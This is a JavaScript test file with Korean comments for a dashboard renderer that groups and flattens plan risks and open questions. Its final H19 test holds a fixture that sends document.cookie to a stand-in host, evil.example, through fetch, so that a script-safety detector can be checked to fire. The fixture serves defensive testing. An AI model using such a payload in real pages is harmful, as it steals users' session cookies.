'use strict';

// Dashboard Data Exploration M1 — PRD-수준 그룹핑 순수 함수 + PE 토대 회귀.
// Dashboard Readability M2 — 위험·질문 평탄화. groupByPrd 순수 (a) 테스트는 불변
// (함수 미변경, filterOptions 수집 전용으로 잔존). (b)/(c) 는 flat 구조 단언으로 교체:
// (a) groupByPrd 순서/버킷/fail-open + 충돌 케이스(Codex F2) — 불변
// (b) 위험·질문 섹션 html 평탄(no .prd-group chrome) + data-prd(prdKey) 보존
// (c) STATUS.md md 평탄(그룹 헤더 미방출) + 전체 항목 평문(no-JS 동등)
// (d) design-invariants H1-H19 clean + H19 drift fixture 발화(Codex F1)

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { renderStatus } = require('../index');
const { runOutputConstraints } = require('../output-constraints');
const formatUtils = require('../format-utils');
const { renderRisks } = require('../sections/risks');
const { renderOpenQuestions } = require('../sections/open-questions');
const {
  groupByPrd, GLOBAL_KEY, UNKNOWN_KEY, GLOBAL_LABEL, UNKNOWN_LABEL,
} = require('../parsers/prd-group');

// 2 PRD planPrd 픽스처 — Data Exploration M1 후속(해결됨·보관됨 탭 그룹핑) 공유.
function twoPrdPlanPrd() {
  return new Map([
    ['.claude/plans/p1.plan.md', { prdPath: '/x/a.prd.md', prdLabel: 'PRD 알파', prdKey: 'a' }],
    ['.claude/plans/p2.plan.md', { prdPath: '/x/b.prd.md', prdLabel: 'PRD 베타', prdKey: 'b' }],
  ]);
}

// ── (a) groupByPrd 순수 함수 ──────────────────────────────────────────────

test('groupByPrd — 2 PRD 그룹 prdKey 사전순 + __global__/__unknown__ 끝', () => {
  const planPrd = new Map([
    ['.claude/plans/b.plan.md', { prdPath: '/x/zeta.prd.md', prdLabel: 'Zeta', prdKey: 'zeta' }],
    ['.claude/plans/a.plan.md', { prdPath: '/x/alpha.prd.md', prdLabel: 'Alpha', prdKey: 'alpha' }],
  ]);
  const items = [
    { source: '.claude/plans/b.plan.md', risk: 'r-zeta' },
    { source: '.claude/plans/a.plan.md', risk: 'r-alpha' },
    { source: 'STATE.md', text: 'q-global' },
    { source: '.claude/plans/unmapped.plan.md', risk: 'r-unknown' },
  ];
  const groups = groupByPrd(items, planPrd);
  assert.deepEqual(groups.map((g) => g.prdKey), ['alpha', 'zeta', GLOBAL_KEY, UNKNOWN_KEY]);
  assert.equal(groups[0].items.length, 1);
  assert.equal(groups[2].prdLabel, GLOBAL_LABEL);
  assert.equal(groups[3].prdLabel, UNKNOWN_LABEL);
});

test('groupByPrd — 동명 basename 다른 디렉토리는 별 그룹(오귀속 0, Codex F2)', () => {
  const planPrd = new Map([
    ['.claude/plans/m1.plan.md', { prdPath: '/a/p.prd.md', prdLabel: 'PRD A', prdKey: 'a-p' }],
    ['archive/.claude/plans/m1.plan.md', { prdPath: '/b/p.prd.md', prdLabel: 'PRD B', prdKey: 'b-p' }],
  ]);
  const groups = groupByPrd([
    { source: '.claude/plans/m1.plan.md', risk: 'r-a' },
    { source: 'archive/.claude/plans/m1.plan.md', risk: 'r-b' },
  ], planPrd);
  assert.equal(groups.length, 2, '동명 basename 이 한 그룹으로 병합되지 않음');
});

test('groupByPrd — 동일 H1 라벨 두 PRD는 prdKey로 분리(라벨 slug 충돌 회피, Codex F2)', () => {
  const planPrd = new Map([
    ['.claude/plans/x.plan.md', { prdPath: '/a/dup.prd.md', prdLabel: '동일 제목', prdKey: 'a-dup' }],
    ['.claude/plans/y.plan.md', { prdPath: '/b/dup.prd.md', prdLabel: '동일 제목', prdKey: 'b-dup' }],
  ]);
  const groups = groupByPrd([
    { source: '.claude/plans/x.plan.md', risk: 'rx' },
    { source: '.claude/plans/y.plan.md', risk: 'ry' },
  ], planPrd);
  assert.equal(groups.length, 2, '동일 라벨이라도 prdKey 다르면 별 그룹');
  assert.deepEqual(groups.map((g) => g.prdLabel), ['동일 제목', '동일 제목']);
});

test('groupByPrd — fail-open: null planPrd → 단일 그룹(항목 누락 0)', () => {
  const groups = groupByPrd([{ source: 'a' }, { source: 'b' }, { source: 'STATE.md' }], null);
  assert.equal(groups.length, 1);
  assert.equal(groups[0].prdKey, GLOBAL_KEY);
  assert.equal(groups[0].items.length, 3, '모든 항목이 단일 fallback 그룹에');
  assert.deepEqual(groupByPrd([], null), [], '빈 입력 → 빈 배열');
});

test('groupByPrd — source_prd 부재(planPrd 미등록) → __unknown__, STATE.md → __global__', () => {
  const planPrd = new Map();
  const groups = groupByPrd([
    { source: '.claude/plans/orphan.plan.md', risk: 'r' },
    { source: 'STATE.md', text: 'q' },
  ], planPrd);
  const byKey = Object.fromEntries(groups.map((g) => [g.prdKey, g]));
  assert.ok(byKey[UNKNOWN_KEY], 'unmapped plan → 출처 미상');
  assert.ok(byKey[GLOBAL_KEY], 'STATE.md → 프로젝트 전역');
});

// ── (b)(c)(d) multi-PRD 풀 렌더 ───────────────────────────────────────────

function twoPrdRender() {
  const now = Date.now();
  const model = {
    derived_at: new Date(now).toISOString(),
    masked: true,
    m0_capability: { contract_present: true },
    warnings: [],
    sources: {
      plans: {
        items: [
          { path: '.claude/plans/p1.plan.md', source_prd: '.claude/prds/prd1.prd.md' },
          { path: '.claude/plans/p2.plan.md', source_prd: '.claude/prds/prd2.prd.md' },
        ],
      },
      receipts: { items: [] },
      state: { item: { body: { open_questions: ['전역 질문 G'] } } },
      backlog: { count: 0, items: [] },
      fix_task: { item: null },
      pr: { item: null },
      envelopes: { count: 0, items: [] },
    },
    correlations: [],
  };
  const PRD1 = '# 데이터 탐색 PRD\n\n## Delivery Milestones\n\n| # | M | O | Status | Plan |\n'
    + '|---|---|---|---|---|\n| 1 | M1 | x | in-progress | [p1](.claude/plans/p1.plan.md) |\n';
  const PRD2 = '# 멀티세션 PRD\n\n## Delivery Milestones\n\n| # | M | O | Status | Plan |\n'
    + '|---|---|---|---|---|\n| 1 | M1 | x | in-progress | [p2](.claude/plans/p2.plan.md) |\n';
  const PLAN1 = '# p1\n\n## Open Questions\n\n- 질문 A1 (HIGH)\n\n## Risks\n\n'
    + '| Risk | Likelihood | Impact | Mitigation |\n|---|---|---|---|\n| 위험 A1 | High | High | m |\n';
  const PLAN2 = '# p2\n\n## Open Questions\n\n- 질문 B1 (HIGH)\n\n## Risks\n\n'
    + '| Risk | Likelihood | Impact | Mitigation |\n|---|---|---|---|\n| 위험 B1 | High | High | m |\n';
  const fsRead = (p) => {
    const s = String(p).replace(/\\/g, '/');
    if (s.endsWith('prd1.prd.md')) return PRD1;
    if (s.endsWith('prd2.prd.md')) return PRD2;
    if (s.endsWith('p1.plan.md')) return PLAN1;
    if (s.endsWith('p2.plan.md')) return PLAN2;
    throw new Error('ENOENT ' + p);
  };
  return renderStatus(model, { cwd: '/repo', fsRead, snapshotsDir: null });
}

test('multi-PRD (b) — 위험·질문 html 평탄(no .prd-group) + data-prd(prdKey) 보존', () => {
  const r = twoPrdRender();
  const groupCount = (r.html.match(/class="prd-group"/g) || []).length;
  assert.equal(groupCount, 0, '평탄화 — prd-group chrome 0: ' + groupCount);
  assert.ok(/<li class="li-item" data-prd="[^"]+"/.test(r.html), 'li-item 에 data-prd 부여(필터축 보존)');
  assert.ok(r.html.includes('data-prd="__global__"'), 'STATE.md OQ → __global__ data-prd');
});

test('multi-PRD (c) — STATUS.md md 평탄(그룹 헤더 미방출) + 전체 항목 평문(no-JS 동등)', () => {
  const r = twoPrdRender();
  assert.ok(!r.md.includes('**데이터 탐색 PRD · '), '평탄 — PRD1 그룹 헤더 미방출');
  assert.ok(!r.md.includes('**멀티세션 PRD · '), '평탄 — PRD2 그룹 헤더 미방출');
  for (const t of ['위험 A1', '위험 B1', '질문 A1', '질문 B1', '전역 질문 G']) {
    assert.ok(r.md.includes(t), '항목 평문 누락: ' + t);
  }
});

test('multi-PRD (d) — design-lint H1-H19 clean(그룹 마크업 회귀 0)', () => {
  const r = twoPrdRender();
  assert.deepEqual(r.design_constraint_violations, [],
    'design-lint violations: ' + JSON.stringify(r.design_constraint_violations));
  assert.equal(r.design_lint_degraded, false);
});

test('multi-PRD — no-JS degrade: script 제거 후에도 전체 항목 가시(flat <ul>)', () => {
  const r = twoPrdRender();
  const noScript = r.html.replace(/<script[\s\S]*?<\/script>/gi, '');
  for (const t of ['위험 A1', '위험 B1', '질문 A1', '질문 B1', '전역 질문 G']) {
    assert.ok(noScript.includes(t), 'JS 제거 후 항목 손실: ' + t);
  }
  // 평탄 <ul class="stack-list"> 는 disclosure 없이 전 항목 가시(no-JS 베이스라인).
  assert.ok(!r.html.includes('class="prd-group"'), '평탄 — prd-group chrome 0');
  assert.ok(!r.html.includes('<script src'), '외부 <script src> 0 (H13)');
});

// ── M1 후속 — 해결됨·보관됨 탭 그룹핑 (위험·질문 동형) ─────────────────────

test('risks 미해결·해결됨·보관됨 탭 평탄(no prd-group) + data-prd 보존(Readability M2)', () => {
  const planPrd = twoPrdPlanPrd();
  const risks = [
    { risk: '활성 A', impact: 'High', likelihood: 'High', mitigation: 'm', source: '.claude/plans/p1.plan.md', ordinal: 1 },
    { risk: '해결 A', impact: 'High', likelihood: 'High', mitigation: 'm', source: '.claude/plans/p1.plan.md', ordinal: 2, resolved: true },
    { risk: '해결 B', impact: 'High', likelihood: 'High', mitigation: 'm', source: '.claude/plans/p2.plan.md', ordinal: 3, resolved: true },
    { risk: '보관 A', impact: 'High', likelihood: 'High', mitigation: 'm', source: '.claude/plans/p1.plan.md', ordinal: 4, sourceClosed: true },
    { risk: '보관 B', impact: 'High', likelihood: 'High', mitigation: 'm', source: '.claude/plans/p2.plan.md', ordinal: 5, sourceClosed: true },
  ];
  const { html, md } = renderRisks({ sources: {} }, formatUtils, { risks, planPrd });
  // Dashboard Readability M2 — 평탄화. 미해결/해결됨/보관됨 세 탭 모두 flat(no prd-group).
  assert.equal((html.match(/class="prd-group"/g) || []).length, 0, '평탄 — prd-group chrome 0');
  assert.ok(html.includes('data-prd="a"') && html.includes('data-prd="b"'),
    '두 PRD 출처 항목 모두 data-prd 보존(필터축)');
  assert.ok(md.includes('해결됨 2건'), '해결됨 외곽 collapse');
  assert.ok(md.includes('보관됨 2건'), '보관됨 외곽 collapse');
  assert.ok(!md.includes('**PRD 알파 · '), '평탄 — 그룹 헤더 미방출');
  for (const t of ['해결 A', '해결 B', '보관 A', '보관 B']) {
    assert.ok(md.includes(t), 'plain-text 누락(no-JS 동등): ' + t);
  }
});

test('단일 실제 PRD 위험도 평탄(no prd-group) + data-prd 보존(Readability M2)', () => {
  const planPrd = twoPrdPlanPrd();
  const risks = [
    { risk: '활성 A', impact: 'High', likelihood: 'High', mitigation: 'm', source: '.claude/plans/p1.plan.md', ordinal: 1 },
    { risk: '활성 A2', impact: 'High', likelihood: 'High', mitigation: 'm', source: '.claude/plans/p1.plan.md', ordinal: 2 },
  ];
  const { html, md } = renderRisks({ sources: {} }, formatUtils, { risks, planPrd });
  assert.equal((html.match(/class="prd-group"/g) || []).length, 0, '평탄 — prd-group 0');
  assert.ok(html.includes('data-prd="a"'), '실제 PRD prdKey data-prd 노출(필터축)');
  assert.ok(!md.includes('**PRD 알파 · '), '평탄 — 그룹 헤더 미방출');
  assert.ok(md.includes('활성 A2'), '항목 평문 present');
});

test('단일 fallback(전역/미상) 그룹은 flat 유지(chrome 노이즈 회피)', () => {
  const planPrd = twoPrdPlanPrd();
  // source 부재 → __global__ 단일 fallback 그룹.
  const risks = [
    { risk: '전역 A', impact: 'High', likelihood: 'High', mitigation: 'm', ordinal: 1 },
    { risk: '전역 B', impact: 'High', likelihood: 'High', mitigation: 'm', ordinal: 2 },
  ];
  const { html, md } = renderRisks({ sources: {} }, formatUtils, { risks, planPrd });
  assert.equal((html.match(/class="prd-group"/g) || []).length, 0, '단일 fallback → flat(헤더 없음)');
  assert.ok(!md.includes('**' + GLOBAL_LABEL + ' ·'), '프로젝트 전역 단독은 md 헤더 없음');
});

test('questions 미해결·해결됨 탭 평탄(no prd-group) + data-prd 보존(Readability M2)', () => {
  const planPrd = twoPrdPlanPrd();
  const model = { sources: { state: { item: { body: { open_questions: [] } } } } };
  const planBody = {
    planPrd,
    openQuestions: [
      { text: '미해결 Q1', source: '.claude/plans/p1.plan.md', lineNumber: 1, severity: 'HIGH' },
      { text: '미해결 Q2', source: '.claude/plans/p1.plan.md', lineNumber: 2, severity: 'HIGH' },
      { text: '해결 Q1', source: '.claude/plans/p1.plan.md', lineNumber: 3, severity: 'HIGH', resolved: true },
      { text: '해결 Q2', source: '.claude/plans/p2.plan.md', lineNumber: 4, severity: 'HIGH', resolved: true },
    ],
  };
  const { html, md } = renderOpenQuestions(model, formatUtils, planBody);
  // Dashboard Readability M2 — 평탄화. 미해결/해결됨 두 탭 모두 flat(no prd-group).
  assert.equal((html.match(/class="prd-group"/g) || []).length, 0, '평탄 — prd-group 0');
  assert.ok(html.includes('data-prd="a"') && html.includes('data-prd="b"'),
    '두 PRD 출처 질문 모두 data-prd 보존(필터축)');
  assert.ok(!md.includes('**PRD 알파 · ') && !md.includes('**PRD 베타 · '), '평탄 — 그룹 헤더 미방출');
  assert.ok(md.includes('해결됨 2건'), '해결됨 외곽 collapse');
  for (const t of ['해결 Q1', '해결 Q2']) assert.ok(md.includes(t), 'plain-text 누락: ' + t);
});

// ── (d) H19 drift fixture ─────────────────────────────────────────────────

test('H19 — inline <script> 본문 network primitive drift 발화 + carve-out', () => {
  const fire = runOutputConstraints({
    css: '',
    html: '<body><script>(function(){var x=fetch("https://evil.example/?"+document.cookie)})()</script></body>',
    md: '',
  });
  assert.ok(fire.violations.includes('H19'), 'H19 fires on inline fetch + external URL');

  // application/json 데이터(plan 텍스트의 정당한 URL 가능)는 제외.
  const json = runOutputConstraints({
    css: '',
    html: '<body><script type="application/json">{"u":"https://ok.example"}</script></body>',
    md: '',
  });
  assert.ok(!json.violations.includes('H19'), 'application/json 데이터는 H19 무관');

  // 정상 explore.js(DOM-only)는 H19 clean.
  const explore = fs.readFileSync(path.join(__dirname, '..', 'client', 'explore.js'), 'utf8');
  const clean = runOutputConstraints({ css: '', html: '<body><script>' + explore + '</script></body>', md: '' });
  assert.ok(!clean.violations.includes('H19'), '정상 explore.js 는 H19 clean');
});
